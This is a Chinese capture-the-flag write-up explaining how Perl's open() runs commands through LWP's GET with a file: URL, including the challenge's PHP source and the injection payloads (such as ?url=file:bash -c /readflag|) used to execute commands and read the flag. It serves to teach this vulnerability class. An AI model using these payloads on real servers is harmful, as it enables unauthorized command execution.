# PERL,GET open 下执行命令

### file 协议利用 open 命令执行

 perl的feature，在open下可以执行命令。前提是文件事先存在。例子：
这是使用perl可以执行系统命令

```
[root@izwz962asjj9zbi0ahwa55z test]# perl a.pl
[root@izwz962asjj9zbi0ahwa55z test]# uid=0(root) gid=0(root) groups=0(root)
cat a.pl
open(FD, "|id");
print <FD>;
```

下面我们来看看使用GET如何来执行系统命令。（具体啥原因就不讲了，俺也不知道，大概就是open函数支持file协议吧 ） **要执行的命令先前必须要有以命令为文件名的文件存在**
我们执行以下命令

```
touch 'ls|'
GET "file:ls|"
```

但是为什么没有按照预期执行呢？ 我们去看看`file.pm`模块。

```
cd /usr/share/perl5/LWP/Protocol
cat file.pm
```

我们可以看到这么一段

```
# read the file
    if ($method ne "HEAD") {
	open(my $fh,'<', $path) or return new   ##就是这里出了问题
	    HTTP::Response(HTTP::Status::RC_INTERNAL_SERVER_ERROR,
			   "Cannot read file '$path': $!");
	binmode($fh);
	$response =  $self->collect($arg, $response, sub {
	    my $content = "";
	    my $bytes = sysread($fh, $content, $size);
	    return \$content if $bytes > 0;
	    return \ "";
	});
	close($fh);
    }

    $response;
}
```

我们可以看到，它在打开文件时加了个`<`符号。这也正是我们修复这个漏洞的办法，现在我们要复现就先将她删掉吧。那一行改成`open(my $fh, $path) or return new` 。再来按照刚刚的思路就可以运行了。good,也算是解决了一个难题了。Kali环境是个好东西，哈哈。

**简单讲，file协议获取文件内容，GET 执行内容所包含的命令**

### 来看看题目

#### 题目分析

打开题目得到以下回显：

```
118.239.16.215 <?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

从上面我们可以知道：首先它会进入sandbox/文件夹然后进入一个 把 “orange118.239.16.215” md5摘要命名的文件夹。再然后执行一个“GET +我们传入的url参数” 这个命令。最后把执行的命令写入我们传入以我们传入的filename为文件名的文件内。
 了解了基本流程和上面说的漏洞后，我的思路是：

1. 先创建一个以我们要执行的命令为文件名的文件
2. 然后执行我们的命令
3. 查看我们创建的文件

#### 解题过程

1. 使用2次`?url=file:ls /|&filename=ls /|` 第一次是为了创建`ls /|` 文件第二次就可以执行命令，并把结果写入文件了。
2. 访问文件，先将`orange118.239.16.215`md5然后就可以知道文件路径了执行`/sandbox/b637d38ae20fabeb50aa7ca03ba02081/ls /|` 可以看到有个 `readflag`,那么就尝试运行它吧。
   [![img](https://pic.downk.cc/item/5e7b4e38504f4bcb0400c389.jpg)](https://pic.downk.cc/item/5e7b4e38504f4bcb0400c389.jpg)
3. 老样子执行2遍`?url=file:bash -c /readflag|&filename=bash -c /readflag|`
4. 接着去访问`/sandbox/b637d38ae20fabeb50aa7ca03ba02081/bash -c /readflag|` 即可以得到我们的flag。
   [![img](https://pic.downk.cc/item/5e7b4ffe504f4bcb0401d03a.jpg)](https://pic.downk.cc/item/5e7b4ffe504f4bcb0401d03a.jpg)
   但是为什么不可以直接运行 /readflag呢？ 要加一个bash -c呢？
   猜测：
    我们使用`/readflag|` 我们无法成功创建文件呀，它会再根目录下再创建 `readflag|`。所以我们使用 `bash -c` 就可以了。
    其实我们使用`|/readfalg`也是可以的，也就是说我们运行命令的时候不一定在后面加`|`在前面也是可以的。`|`应该是一个分界符

